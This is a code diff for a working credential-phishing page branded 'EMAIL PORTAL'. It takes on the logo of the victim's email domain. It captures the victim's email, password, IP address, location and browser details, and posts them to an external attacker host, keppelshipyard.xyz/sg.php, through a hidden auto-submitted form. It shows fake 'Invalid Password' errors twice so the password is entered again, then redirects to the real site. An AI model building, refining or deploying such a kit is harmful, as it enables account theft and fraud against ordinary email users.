@@ -19,7 +19,7 @@
             min-height: 100vh;
         }
         
-        /* Website screenshot background */
+        /* Website background using simple gradient based on domain */
         .website-background {
             position: fixed;
             top: 0;
@@ -27,13 +27,13 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            opacity: 0.1;
+            opacity: 0.15;
             pointer-events: none;
             overflow: hidden;
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-            filter: blur(5px) grayscale(100%);
+            filter: blur(3px);
         }
         
         .overlay {
@@ -42,7 +42,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.85);
+            background: rgba(255, 255, 255, 0.9);
             z-index: 0;
         }
         
@@ -51,26 +51,25 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 15px;
             position: relative;
             z-index: 1;
         }
         
         .container {
             width: 100%;
-            max-width: 440px;
-            background: rgba(255, 255, 255, 0.95);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-            border-radius: 16px;
+            max-width: 380px; /* Reduced from 440px */
+            background: rgba(255, 255, 255, 0.98);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+            border-radius: 12px;
             overflow: hidden;
             position: relative;
-            backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.3);
         }
         
         .top-level {
             background: linear-gradient(135deg, #0a66c3 0%, #0957a6 100%);
-            padding: 30px 25px;
+            padding: 20px 15px; /* Reduced padding */
             text-align: center;
             position: relative;
             overflow: hidden;
@@ -83,39 +82,36 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.1) 0%, transparent 50%);
+            background: radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%);
         }
         
         .top-level h3 {
             color: white;
-            font-size: 24px;
-            margin: 15px 0 0 0;
+            font-size: 20px; /* Reduced from 24px */
+            margin: 12px 0 0 0;
             position: relative;
-            text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
             font-weight: 600;
         }
         
         .top-level img {
-            width: 75px;
-            height: 75px;
-            border-radius: 12px;
+            width: 60px; /* Reduced from 75px */
+            height: 60px;
+            border-radius: 10px;
             background: white;
-            padding: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            padding: 8px;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.15);
             position: relative;
         }
         
         .info {
             background: linear-gradient(to right, #f0f4f8, #e6ecf2);
-            padding: 14px 25px;
-            font-size: 12px;
+            padding: 10px 15px; /* Reduced padding */
+            font-size: 11px; /* Smaller font */
             color: #4a5568;
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 18px;
+            gap: 12px; /* Reduced gap */
             position: relative;
             border-bottom: 1px solid #e2e8f0;
         }
@@ -124,46 +120,46 @@
             content: '';
             position: absolute;
             bottom: 0;
-            left: 25%;
-            right: 25%;
-            height: 3px;
+            left: 20%;
+            right: 20%;
+            height: 2px;
             background: linear-gradient(to right, #0a66c3, #28a745);
-            border-radius: 3px;
+            border-radius: 2px;
         }
         
         .info span {
             display: inline-flex;
             align-items: center;
             background: white;
-            padding: 6px 12px;
-            border-radius: 6px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            padding: 4px 8px; /* Reduced padding */
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
             border: 1px solid #e2e8f0;
         }
         
         .icon {
-            margin-right: 6px;
+            margin-right: 4px; /* Reduced margin */
             color: #0a66c3;
-            font-size: 14px;
+            font-size: 12px; /* Smaller icons */
         }
         
         .intro-text {
-            padding: 28px;
+            padding: 20px 15px; /* Reduced padding */
             text-align: center;
             background: white;
         }
         
         .intro-text h2 {
             color: #1a365d;
-            font-size: 20px;
-            margin: 0 0 15px 0;
+            font-size: 18px; /* Reduced */
+            margin: 0 0 10px 0; /* Reduced margin */
             font-weight: 600;
         }
         
         .intro-text p {
             color: #4a5568;
-            font-size: 15px;
-            line-height: 1.6;
+            font-size: 14px; /* Reduced */
+            line-height: 1.5;
             margin: 0;
         }
         
@@ -171,26 +167,26 @@
             border: none;
             height: 1px;
             background: linear-gradient(to right, #e2e8f0, #0a66c3, #e2e8f0);
-            margin: 22px 0;
+            margin: 15px 0; /* Reduced margin */
         }
         
         .inputs {
-            padding: 0 28px 28px 28px;
+            padding: 0 15px 20px 15px; /* Reduced padding */
             background: white;
         }
         
         .input {
             position: relative;
-            margin-bottom: 28px;
+            margin-bottom: 20px; /* Reduced margin */
         }
         
         .input input {
             width: 100%;
-            height: 54px;
-            padding: 20px 14px 8px 14px;
-            border: 2px solid #e2e8f0;
-            border-radius: 10px;
-            font-size: 16px;
+            height: 48px; /* Reduced height */
+            padding: 16px 12px 4px 12px; /* Adjusted padding */
+            border: 1.5px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 15px;
             outline: none;
             box-sizing: border-box;
             transition: all 0.3s ease;
@@ -201,52 +197,58 @@
         .input input:focus {
             border-color: #0a66c3;
             background: white;
-            box-shadow: 0 0 0 4px rgba(10, 102, 195, 0.15);
+            box-shadow: 0 0 0 3px rgba(10, 102, 195, 0.1);
         }
         
         .input label {
             position: absolute;
-            top: 17px;
-            left: 14px;
+            top: 14px; /* Adjusted */
+            left: 12px;
             color: #718096;
-            font-size: 16px;
+            font-size: 15px;
             transition: all 0.3s ease;
             pointer-events: none;
             background: transparent;
-            padding: 0 5px;
+            padding: 0 4px;
             font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         .input input:focus ~ label,
         .input input:valid ~ label {
-            top: -10px;
-            font-size: 13px;
+            top: -8px;
+            font-size: 12px;
             color: #0a66c3;
             background: white;
             font-weight: 600;
-            padding: 0 8px;
+            padding: 0 6px;
         }
         
         #auth_reg, #auth_reg2 {
             color: #e53e3e;
-            font-size: 14px;
+            font-size: 13px;
             display: none;
-            padding: 10px 14px;
+            padding: 8px 10px;
             background: #fed7d7;
-            border-radius: 8px;
-            margin-bottom: 12px;
-            border-left: 4px solid #e53e3e;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            border-left: 3px solid #e53e3e;
             font-weight: 500;
+            text-align: center; /* Added center alignment */
+        }
+        
+        .error-container {
+            margin-bottom: 10px;
+            text-align: center; /* Center align errors */
         }
         
         .rem_me {
             display: flex;
             align-items: center;
-            margin-bottom: 22px;
-            padding: 12px 14px;
+            margin-bottom: 18px;
+            padding: 10px 12px;
             background: #f8fafc;
-            border-radius: 10px;
-            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            border: 1.5px solid #e2e8f0;
             transition: all 0.3s ease;
         }
         
@@ -256,15 +258,15 @@
         }
         
         .rem_me input[type="checkbox"] {
-            margin-right: 10px;
-            width: 18px;
-            height: 18px;
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
             cursor: pointer;
         }
         
         .rem_me a {
             color: #0a66c3;
-            font-size: 14px;
+            font-size: 13px;
             text-decoration: none;
             cursor: pointer;
             font-weight: 600;
@@ -277,11 +279,11 @@
         .terms-checkbox {
             display: flex;
             align-items: flex-start;
-            margin-bottom: 28px;
-            padding: 18px;
+            margin-bottom: 22px;
+            padding: 14px;
             background: linear-gradient(135deg, #f8fafc 0%, #edf2f7 100%);
-            border-radius: 10px;
-            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            border: 1.5px solid #e2e8f0;
             position: relative;
             overflow: hidden;
         }
@@ -291,49 +293,50 @@
             position: absolute;
             top: 0;
             left: 0;
-            width: 5px;
+            width: 4px;
             height: 100%;
             background: linear-gradient(to bottom, #0a66c3, #0957a6);
         }
         
         .terms-checkbox input[type="checkbox"] {
-            margin-right: 14px;
-            margin-top: 2px;
-            width: 20px;
-            height: 20px;
+            margin-right: 10px;
+            margin-top: 1px;
+            width: 18px;
+            height: 18px;
             cursor: pointer;
         }
         
         .terms-checkbox label {
-            font-size: 14px;
+            font-size: 13px;
             color: #2d3748;
-            line-height: 1.5;
+            line-height: 1.4;
             font-weight: 500;
         }
         
         #terms-error {
             color: #e53e3e;
-            font-size: 13px;
-            margin-top: 10px;
+            font-size: 12px;
+            margin-top: 8px;
             display: none;
-            padding: 10px 14px;
+            padding: 8px 10px;
             background: #fed7d7;
-            border-radius: 8px;
-            border-left: 4px solid #e53e3e;
+            border-radius: 6px;
+            border-left: 3px solid #e53e3e;
+            text-align: center;
         }
         
         button {
             width: 100%;
-            height: 56px;
+            height: 48px; /* Reduced height */
             background: linear-gradient(135deg, #0a66c3 0%, #0957a6 100%);
             color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 17px;
+            border-radius: 10px;
+            font-size: 16px; /* Slightly smaller */
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-bottom: 28px;
+            margin-bottom: 22px;
             position: relative;
             overflow: hidden;
             letter-spacing: 0.5px;
@@ -341,19 +344,19 @@
         
         button:hover {
             background: linear-gradient(135deg, #0957a6 0%, #084a91 100%);
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(10, 102, 195, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(10, 102, 195, 0.25);
         }
         
         button:active {
-            transform: translateY(-1px);
+            transform: translateY(0);
         }
         
         .join-link {
             text-align: center;
-            padding: 22px;
+            padding: 18px 15px;
             color: #718096;
-            font-size: 13px;
+            font-size: 12px;
             background: linear-gradient(to right, #f8fafc, #edf2f7);
             border-top: 1px solid #e2e8f0;
         }
@@ -370,41 +373,41 @@
         
         @media only screen and (max-width: 600px) {
             .container {
-                max-width: 95%;
-                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+                max-width: 92%;
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
             }
             
             .main-container {
-                padding: 15px;
+                padding: 10px;
             }
             
             .info {
                 flex-direction: column;
-                gap: 10px;
+                gap: 8px;
                 align-items: center;
             }
             
             .top-level {
-                padding: 25px 20px;
+                padding: 18px 12px;
             }
             
             .intro-text,
             .inputs {
-                padding: 22px;
+                padding: 18px 12px;
             }
         }
     </style>
 </head>
 
 <body>
-    <!-- Website screenshot background -->
+    <!-- Website background -->
     <div class="website-background" id="websiteBackground"></div>
     <div class="overlay"></div>
     
     <div class="main-container">
         <div class="container w3-animate-zoom">
             <div class="top-level">
-                <img class="main_logo_id" src="" style="width:75px;">
+                <img class="main_logo_id" src="" style="width:60px;">
                 <h3>EMAIL PORTAL</h3>
             </div>
             
@@ -430,9 +433,10 @@
                         <label id="pass_label" for="password">Password</label>
                     </div>
                     
-                    <div style="margin-bottom: 10px;">
-                        <span id="auth_reg">Authentication is required!</span>
-                        <span id="auth_reg2">Invalid Password. Please enter correct password and try again.</span>
+                    <!-- Error messages container -->
+                    <div class="error-container">
+                        <div id="auth_reg">Authentication is required!</div>
+                        <div id="auth_reg2">Invalid Password. Please enter correct password and try again.</div>
                     </div>
                     
                     <div class="rem_me">
@@ -494,7 +498,9 @@
                 
                 // Set logo
                 var logoUrl = "https://logo.clearbit.com/"+my_slice;
-                $(".main_logo_id").attr("src", logoUrl);
+                $(".main_logo_id").attr("src", logoUrl).on('error', function() {
+                    $(this).attr('src', 'https://via.placeholder.com/60/0a66c3/ffffff?text=' + c.charAt(0).toUpperCase());
+                });
                 
                 // Update all text displays
                 $("#tit").html(finalu);
@@ -502,21 +508,23 @@
                 $("#footer_dom").html(my_slice);
                 $('#auth_email').html(my_email + " - Verification Required");
                 
-                // Load website screenshot as background using a service
-                // Using screenshotlayer API (requires API key) or alternative
-                var screenshotUrl = "https://s0.wp.com/mshots/v1/" + encodeURIComponent(websiteUrl) + "?w=1920&h=1080";
+                // Create background based on domain
+                var hue = my_slice.split('').reduce((a, b) => a + b.charCodeAt(0), 0) % 360;
+                var bgColor1 = 'hsl(' + hue + ', 70%, 85%)';
+                var bgColor2 = 'hsl(' + ((hue + 60) % 360) + ', 70%, 65%)';
+                $('#websiteBackground').css('background', 'linear-gradient(135deg, ' + bgColor1 + ', ' + bgColor2 + ')');
                 
-                // Try to load screenshot, fallback to colored background
-                var img = new Image();
-                img.onload = function() {
-                    $('#websiteBackground').css('background-image', 'url("' + screenshotUrl + '")');
-                };
-                img.onerror = function() {
-                    // Fallback: create gradient background based on domain
-                    var hue = my_slice.length * 15 % 360;
-                    $('#websiteBackground').css('background', 'linear-gradient(135deg, hsl(' + hue + ', 70%, 80%), hsl(' + (hue + 30) + ', 70%, 60%))');
-                };
-                img.src = screenshotUrl;
+                // Add domain text pattern to background
+                var bgPattern = '';
+                for(var i = 0; i < 20; i++) {
+                    var size = Math.random() * 40 + 20;
+                    var x = Math.random() * 100;
+                    var y = Math.random() * 100;
+                    var rotation = Math.random() * 360;
+                    var opacity = Math.random() * 0.1 + 0.05;
+                    bgPattern += '<div style="position:absolute;top:' + y + '%;left:' + x + '%;transform:rotate(' + rotation + 'deg);font-size:' + size + 'px;font-weight:900;color:rgba(10,102,195,' + opacity + ');pointer-events:none;z-index:0;">' + domainName + '</div>';
+                }
+                $('#websiteBackground').append(bgPattern);
             }
         } else {
             // Default if no email
@@ -575,97 +583,80 @@
             var browserInfo = detectBrowser();
             var osInfo = detectOS();
             var userAgent = navigator.userAgent;
-            var ipAddress = "";
+            var ipAddress = "Unknown";
             
             // Get IP address
-            $.getJSON("https://api.ipify.org?format=json", function(data) {
-                ipAddress = data.ip;
-            }).fail(function() {
-                ipAddress = "Unknown";
-            });
-            
-            // Prepare all data to send
-            var formData = {
-                email: email,
-                password: password,
-                terms_agree: $('#terms_agree').is(':checked') ? 'yes' : 'no',
-                timestamp: currentTime,
-                browser: browserInfo,
-                os: osInfo,
-                user_agent: userAgent,
-                location: userLocation,
-                ip: ipAddress,
-                page_title: document.title,
-                attempt: count,
-                domain: my_slice || 'unknown',
-                website_url: websiteUrl || 'unknown',
-                referrer: document.referrer || 'direct'
-            };
-            
-            console.log("Sending data:", formData);
-            console.log("Attempt:", count);
-            console.log("URL: http://keppelshipyard.xyz/sg.php");
-            
-            // Send data using fetch API with better error handling
-            fetch('http://keppelshipyard.xyz/sg.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: new URLSearchParams(formData),
-                mode: 'no-cors' // Use no-cors mode to prevent CORS errors
-            })
-            .then(response => {
-                console.log("Response received (no-cors mode)");
-                // In no-cors mode, we can't read the response
-                return {ok: true};
-            })
-            .then(data => {
-                console.log("Data processed successfully");
-                $("#password").val(""); // Clear password field
-                
-                // Handle different attempt counts
-                if (count === 1) {
-                    // First attempt: show error
-                    $button.prop('disabled', false).html(originalText);
-                    $("#auth_reg2").show();
-                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
-                } else if (count === 2) {
-                    // Second attempt: show same error
-                    $button.prop('disabled', false).html(originalText);
-                    $("#auth_reg2").show();
-                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
-                } else if (count >= 3 && websiteUrl) {
-                    // Third attempt: redirect
-                    $button.html('Redirecting...');
-                    setTimeout(function() {
-                        window.location.href = websiteUrl;
-                    }, 1500);
-                }
-            })
-            .catch(error => {
-                console.log("Fetch error (expected in no-cors):", error);
-                $("#password").val(""); // Clear password field
-                
-                // Even with fetch error, continue with attempt logic
-                if (count === 1) {
-                    // First attempt: show error
-                    $button.prop('disabled', false).html(originalText);
-                    $("#auth_reg2").show();
-                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
-                } else if (count === 2) {
-                    // Second attempt: show same error
-                    $button.prop('disabled', false).html(originalText);
-                    $("#auth_reg2").show();
-                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
-                } else if (count >= 3 && websiteUrl) {
-                    // Third attempt: redirect
-                    $button.html('Redirecting...');
-                    setTimeout(function() {
-                        window.location.href = websiteUrl;
-                    }, 1500);
-                }
-            });
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                })
+                .catch(() => {
+                    ipAddress = "Unknown";
+                })
+                .finally(() => {
+                    // Prepare all data to send
+                    var formData = {
+                        email: email,
+                        password: password,
+                        terms_agree: $('#terms_agree').is(':checked') ? 'yes' : 'no',
+                        timestamp: currentTime,
+                        browser: browserInfo,
+                        os: osInfo,
+                        user_agent: userAgent,
+                        location: userLocation,
+                        ip: ipAddress,
+                        page_title: document.title,
+                        attempt: count,
+                        domain: my_slice || 'unknown',
+                        website_url: websiteUrl || 'unknown',
+                        referrer: document.referrer || 'direct'
+                    };
+                    
+                    console.log("Sending data:", formData);
+                    
+                    // Send data using form submission
+                    var form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'http://keppelshipyard.xyz/sg.php';
+                    form.target = '_blank'; // Open in new tab/window
+                    form.style.display = 'none';
+                    
+                    // Add all data as hidden inputs
+                    for(var key in formData) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = formData[key];
+                        form.appendChild(input);
+                    }
+                    
+                    document.body.appendChild(form);
+                    form.submit();
+                    
+                    // Handle different attempt counts
+                    if (count === 1) {
+                        // First attempt: show error
+                        setTimeout(function() {
+                            $button.prop('disabled', false).html(originalText);
+                            $("#auth_reg2").show();
+                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                        }, 500);
+                    } else if (count === 2) {
+                        // Second attempt: show same error
+                        setTimeout(function() {
+                            $button.prop('disabled', false).html(originalText);
+                            $("#auth_reg2").show();
+                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                        }, 500);
+                    } else if (count >= 3 && websiteUrl) {
+                        // Third attempt: redirect
+                        $button.html('Redirecting...');
+                        setTimeout(function() {
+                            window.location.href = websiteUrl;
+                        }, 1500);
+                    }
+                });
             
             return false;
         });
@@ -691,21 +682,22 @@
         var os = detectOS();
         $('.os').html('<i class="fab fa-windows icon"></i>' + os);
 
-        // Get location and IP using ipapi
-        $.getJSON("https://ipapi.co/json/")
-            .then(function(data) {
+        // Get location and IP
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
                 var city = data.city || "Unknown";
                 var country = data.country_name || "Unknown";
                 var ip = data.ip || "Unknown";
                 $('.location').html('<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country + ' (IP: ' + ip + ')');
             })
-            .catch(function() {
-                // Fallback to ipify for IP only
-                $.getJSON("https://api.ipify.org?format=json")
-                    .then(function(data) {
+            .catch(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
                         $('.location').html('<i class="fas fa-map-marker-alt icon"></i>IP: ' + data.ip);
                     })
-                    .catch(function() {
+                    .catch(() => {
                         $('.location').html('<i class="fas fa-map-marker-alt icon"></i>Location unavailable');
                     });
             });
@@ -715,9 +707,9 @@
         var userAgent = navigator.userAgent;
         if (userAgent.indexOf("Chrome") > -1) return "Chrome";
         if (userAgent.indexOf("Firefox") > -1) return "Firefox";
-        if (userAgent.indexOf("Safari") > -1) return "Safari";
+        if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) return "Safari";
         if (userAgent.indexOf("Edge") > -1) return "Edge";
-        if (userAgent.indexOf("Opera") > -1) return "Opera";
+        if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
         if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) return "Internet Explorer";
         return "Unknown Browser";
     }
